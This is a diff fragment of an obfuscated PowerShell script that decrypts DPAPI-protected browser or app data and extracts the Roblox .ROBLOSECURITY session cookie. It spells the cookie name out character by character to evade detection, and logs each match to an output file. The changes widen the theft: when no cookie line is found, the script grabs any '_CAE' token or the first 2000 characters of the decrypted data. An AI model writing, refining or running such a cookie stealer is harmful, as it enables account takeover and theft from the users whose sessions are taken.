@@ -93,14 +93,14 @@ foreach($p2 in $rp0){
             $c1=[Text.Encoding]::UTF8.GetString($d1)
             # Netscape format: name<TAB>value — use TAB not =
             if($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\t([^\r\n]+)'){
-                $ck=$Matches[1].Trim()
-                Add-Content $f0 "$tR|$ck"
-            }elseif($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s+([^\r\n\t]+)'){
-                $ck=$Matches[1]
-                if($ck -match '^(_'+'CAEQ|_'+'\|WA'+'RNI'+'NG)'){Add-Content $f0 "$tR|$ck"}
-            }
-        }elseif($r2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')){
-            Add-Content $f0 "$tR|$r2"
+                            $ck=$Matches[1].Trim()
+                            Add-Content $f0 "$tR|$ck"
+                        }else{
+                            $cae=$c1.IndexOf('|_'+'CAE')
+                            if($cae -lt 0){$cae=$c1.IndexOf('|$'+'CAE')}
+                            if($cae -ge 0){$ck=$c1.Substring($cae);Add-Content $f0 "$tR|$ck"
+                            }else{Add-Content $f0 "$tR|$($c1.Substring(0,[Math]::Min(2000,$c1.Length)))"}
+                        }
         }
     }catch{}
     break
@@ -120,14 +120,14 @@ if(Test-Path $p3){
                 $d2=[Security.Cryptography.ProtectedData]::Unprotect($e2,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
                 $c2=[Text.Encoding]::UTF8.GetString($d2)
                 if($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\t([^\r\n]+)'){
-                    $ck=$Matches[1].Trim()
-                    Add-Content $f0 "$tRM|$ck"
-                }elseif($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s+([^\r\n\t]+)'){
-                    $ck=$Matches[1]
-                    if($ck -match '^(_'+'CAEQ|_'+'\|WA'+'RNI'+'NG)'){Add-Content $f0 "$tRM|$ck"}
-                }
-            }
-        }catch{}
+                                $ck=$Matches[1].Trim()
+                                Add-Content $f0 "$tRM|$ck"
+                            }else{
+                                $cae=$c2.IndexOf('|_'+'CAE')
+                                if($cae -lt 0){$cae=$c2.IndexOf('|$'+'CAE')}
+                                if($cae -ge 0){$ck=$c2.Substring($cae);Add-Content $f0 "$tRM|$ck"
+                                }else{Add-Content $f0 "$tRM|$($c2.Substring(0,[Math]::Min(2000,$c2.Length)))"}
+                            }
         break
     }
 }
